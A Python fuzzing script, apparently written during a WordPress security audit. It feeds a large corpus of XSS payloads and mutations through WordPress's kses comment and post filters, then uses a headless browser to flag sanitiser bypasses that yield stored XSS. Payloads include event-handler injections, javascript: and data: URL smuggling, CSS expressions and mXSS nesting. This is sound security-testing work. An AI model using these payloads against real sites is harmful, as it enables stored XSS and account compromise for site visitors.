#!/usr/bin/env python3
"""
Differential fuzzer for WordPress 7.1's kses save-time filter chains.

For each payload we run the real `pre_comment_content` (anonymous commenter)
and `content_save_pre` (Contributor) chains, then parse the *output* with a
real browser and flag anything the browser turns into script-capable markup.

A hit in the comment chain is unauthenticated stored XSS.
A hit in the post chain is Contributor -> stored XSS.
"""
import json
import os
import random
import string
import subprocess
import sys

from playwright.sync_api import sync_playwright

WP = "/home/user/wpaudit/wordpress"
BATCH = "/home/user/wpaudit/kses_batch.php"
SCRATCH = "/tmp/claude-0/-home-user-mongo/88417634-60f9-5bda-b080-646aad79e105/scratchpad"
CHROME = "/opt/pw-browsers/chromium-1194/chrome-linux/chrome"

# --- payload corpus ---------------------------------------------------------

SINKS = [
    'onerror=alert(1)', 'onload=alert(1)', 'onfocus=alert(1)',
    'onanimationstart=alert(1)', 'ontoggle=alert(1)',
]

SEEDS = [
    # bogus comment state (new handling in 7.1 wp_kses_split2)
    '</ onmouseover=alert(1)><img src=x onerror=alert(1)>',
    '<!x><img src=x onerror=alert(1)>',
    '<!doctype x><img src=x onerror=alert(1)>',
    '</%3E<img src=x onerror=alert(1)>',
    '</!--><img src=x onerror=alert(1)>',
    '<//><img src=x onerror=alert(1)>',
    '<!-- --><img src=x onerror=alert(1)>',
    # comment parsing / dash mangling
    '<!--><img src=x onerror=alert(1)>-->',
    '<!--- --><img src=x onerror=alert(1)>',
    '<!--x--!><img src=x onerror=alert(1)>',
    '<!--[if]><img src=x onerror=alert(1)><![endif]-->',
    '<![CDATA[<img src=x onerror=alert(1)>]]>',
    '<!--<img src=x onerror=alert(1)>',
    '<!----><img src=x onerror=alert(1)>',
    # attribute-boundary confusion
    '<a title="</a><img src=x onerror=alert(1)>">z</a>',
    '<a href="x" title="a\'b" onmouseover=alert(1)>z</a>',
    '<b x="><img src=x onerror=alert(1)>">z</b>',
    '<b `onmouseover=alert(1)`>z</b>',
    '<b/onmouseover=alert(1)>z</b>',
    '<b\nonmouseover=alert(1)>z</b>',
    '<b\ton\nmouseover=alert(1)>z</b>',
    '<b on\x00mouseover=alert(1)>z</b>',
    '<b/"onmouseover=alert(1)">z</b>',
    '<b =onmouseover=alert(1)>z</b>',
    # protocol smuggling
    '<a href="jav&#x09;ascript:alert(1)">z</a>',
    '<a href="&#106;avascript:alert(1)">z</a>',
    '<a href=" javascript:alert(1)">z</a>',
    '<a href="java\nscript:alert(1)">z</a>',
    '<a href="&NewLine;javascript:alert(1)">z</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">z</a>',
    '<a href="&#0000106avascript:alert(1)">z</a>',
    # entity / encoding
    '&lt;img src=x onerror=alert(1)&gt;',
    '&amp;lt;img src=x onerror=alert(1)&amp;gt;',
    '&#60;img src=x onerror=alert(1)&#62;',
    '\xef\xbc\x9cimg src=x onerror=alert(1)\xef\xbc\x9e',
    # style / css
    '<b style="background:url(javascript:alert(1))">z</b>',
    '<b style="width:expression(alert(1))">z</b>',
    '<b style="behavior:url(#default#time2)">z</b>',
    '<b style="-moz-binding:url(http://x/x.xml#x)">z</b>',
    '<b style="clip-path:url(&quot;data:image/svg+xml,<svg onload=alert(1)>&quot;)">z</b>',
    '<b style="fill:url(javascript:alert(1))">z</b>',
    '<b style="background-image:image-set(url(javascript:alert(1)))">z</b>',
    # note-mention span allowance (new in 7.1, comment context)
    '<span class="wp-note-mention user-1" onmouseover=alert(1)>x</span>',
    '<span class="wp-note-mention user-1 evil">x</span>',
    '<span class=wp-note-mention onmouseover=alert(1)>x</span>',
    # nesting / mXSS style
    '<b><![CDATA[><img src=x onerror=alert(1)>]]></b>',
    '<blockquote cite="\'><img src=x onerror=alert(1)>">z</blockquote>',
    '<b title="&lt;/b&gt;&lt;img src=x onerror=alert(1)&gt;">z</b>',
    '<b>&lt;/b&gt;&lt;img src=x onerror=alert(1)&gt;</b>',
    # tag-name quirks
    '<img/src=x onerror=alert(1)>',
    '<img src=x onerror=alert(1)//>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<im\x00g src=x onerror=alert(1)>',
    '<svg><animate attributeName=href values=javascript:alert(1)>',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<form><button formaction=javascript:alert(1)>z',
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
    '<base href="javascript:/a/-alert(1)///////">',
    '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<xmp><img src=x onerror=alert(1)></xmp>',
    '<textarea><img src=x onerror=alert(1)></textarea>',
    '<title><img src=x onerror=alert(1)></title>',
    '<style><img src=x onerror=alert(1)></style>',
    '<template><img src=x onerror=alert(1)></template>',
]

FRAGMENTS = [
    '<!--', '-->', '--!>', '<!', '</', '<//', '<?', '?>', '<![CDATA[', ']]>',
    '<b>', '</b>', '<a href=', '"', "'", '`', '=', '/', '\\', '\x00', '\n',
    '\t', ' ', '<img src=x ', 'onerror=alert(1)', 'javascript:', '&#x6a;',
    '&colon;', '&NewLine;', '&lt;', '&gt;', '&amp;', '<span class=',
    'wp-note-mention', 'user-1', '<svg ', '<math ', '<style ', '<title ',
    '<textarea ', '<noembed ', '<iframe ', 'srcdoc=', 'formaction=',
    '\xef\xbb\xbf', '\xc0\x3c', '\xe2\x80\xa8',
]


EXEC = [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<a href="javascript:alert(1)">z</a>',
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
    '<details open ontoggle=alert(1)>',
    '<style>@import "javascript:alert(1)";</style>',
    '<script>alert(1)</script>',
]

# Constructs that survive kses and are re-processed by the display chain
# (wptexturize, make_clickable, force_balance_tags, wpautop, shortcodes,
# convert_smilies, capital_P_dangit, the block parser).
CONTAINERS = [
    '{}', '<b>{}</b>', '<blockquote>{}</blockquote>', '<pre>{}</pre>',
    '<code>{}</code>', '<!--{}-->', '<!--more {}-->', '<!--nextpage-->{}',
    '[caption id="a" caption="{}"]x[/caption]',
    '[gallery ids="{}"]', '[embed]{}[/embed]', '[audio src="{}"]',
    '[video src="{}"]', '[playlist ids="{}"]',
    '<a href="{}">z</a>', '<a title="{}">z</a>', '<b title="{}">z</b>',
    '<b style="{}">z</b>', '<span class="{}">z</span>',
    '<!-- wp:paragraph {{"x":"{}"}} --><p>y</p><!-- /wp:paragraph -->',
    '<!-- wp:html -->{}<!-- /wp:html -->',
    'http://example.com/{}',
    '"{}"', "'{}'", '&lt;{}&gt;',
]

SEPARATORS = ['', ' ', '\n', '\t', '\x00', '\r', '/', '"', "'", '`', '<', '>',
              '&', ';', '\\', '--', '!', ' ', '﻿']


def mutate(rng):
    mode = rng.random()
    if mode < 0.45:
        payload = rng.choice(EXEC)
        for _ in range(rng.randint(0, 3)):
            pos = rng.randrange(len(payload) + 1)
            payload = payload[:pos] + rng.choice(SEPARATORS) + payload[pos:]
        out = rng.choice(CONTAINERS).format(payload)
        for _ in range(rng.randint(0, 2)):
            out = rng.choice(CONTAINERS).format(out)
        return out
    if mode < 0.75:
        return "".join(rng.choice(FRAGMENTS) for _ in range(rng.randint(2, 10)))
    seed = rng.choice(SEEDS)
    for _ in range(rng.randint(1, 4)):
        pos = rng.randrange(len(seed) + 1)
        seed = seed[:pos] + rng.choice(SEPARATORS + FRAGMENTS) + seed[pos:]
    return seed


def run_kses(payloads):
    p = os.path.join(SCRATCH, "fuzz_in.json")
    with open(p, "w") as f:
        json.dump(payloads, f)
    r = subprocess.run(
        ["wp", "--allow-root", "--path=" + WP, "eval-file", BATCH, p],
        capture_output=True, text=True, timeout=600,
    )
    try:
        return json.loads(r.stdout)
    except Exception:
        sys.stderr.write("kses batch failed: " + r.stdout[:500] + r.stderr[:500] + "\n")
        return []


ORACLE = r"""
(html) => {
  const d = document.implementation.createHTMLDocument('');
  d.body.innerHTML = html;
  const bad = [];
  const DANGEROUS_URL = /^\s*(javascript|data|vbscript)\s*:/i;
  for (const el of d.body.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    if (['script','iframe','object','embed','base','meta','link','form','frame','frameset'].includes(tag)) {
      bad.push('tag:' + tag);
    }
    for (const a of el.attributes) {
      const n = a.name.toLowerCase();
      if (n.startsWith('on')) bad.push('handler:' + tag + '/' + n);
      if (['href','src','action','formaction','data','xlink:href','srcdoc','background','poster','ping'].includes(n)) {
        if (DANGEROUS_URL.test(a.value)) bad.push('url:' + tag + '/' + n + '=' + a.value.slice(0,60));
        if (n === 'srcdoc') bad.push('srcdoc:' + tag);
      }
      if (n === 'style' && /expression\(|behavior\s*:|-moz-binding|javascript:|vbscript:/i.test(a.value)) {
        bad.push('style:' + a.value.slice(0,80));
      }
    }
  }
  return bad;
}
"""


def main():
    rounds = int(sys.argv[1]) if len(sys.argv) > 1 else 30
    batch_size = 250
    rng = random.Random(1337)
    hits = []

    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path=CHROME, args=["--no-sandbox"])
        page = browser.new_page()
        page.set_content("<html><body></body></html>")

        def check(html):
            if not html:
                return []
            return page.evaluate(ORACLE, html)

        # round 0: curated seeds
        batches = [SEEDS]
        for _ in range(rounds):
            batches.append([mutate(rng) for _ in range(batch_size)])

        total = 0
        for bi, payloads in enumerate(batches):
            results = run_kses(payloads)
            for r in results:
                total += 1
                for ctx in ("comment", "comment_display", "post", "post_display", "post_excerpt"):
                    bad = check(r.get(ctx) or "")
                    if bad:
                        hits.append((ctx, r["payload"], r[ctx], bad))
                        print(f"[HIT {ctx}] payload={r['payload']!r}\n"
                              f"          output ={r[ctx]!r}\n"
                              f"          flags  ={bad}", flush=True)
            print(f"-- batch {bi}: {len(results)} payloads, {len(hits)} hits so far", flush=True)

        browser.close()

    print(f"\ndone: {total} payloads, {len(hits)} hits")
    with open(os.path.join(SCRATCH, "kses_hits.json"), "w") as f:
        json.dump(hits, f, indent=1)


if __name__ == "__main__":
    main()
